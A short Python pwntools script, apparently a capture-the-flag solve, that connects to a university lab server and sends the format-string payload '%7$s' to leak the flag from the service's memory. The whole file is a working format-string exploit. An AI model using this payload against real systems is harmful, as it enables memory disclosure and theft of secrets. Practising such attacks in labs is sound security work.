from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt" 
PORT = 25192

s = remote(SERVER, PORT, timeout=9999)

s.sendline(b'%7$s')
flag = s.recv(512).decode()
print(flag)
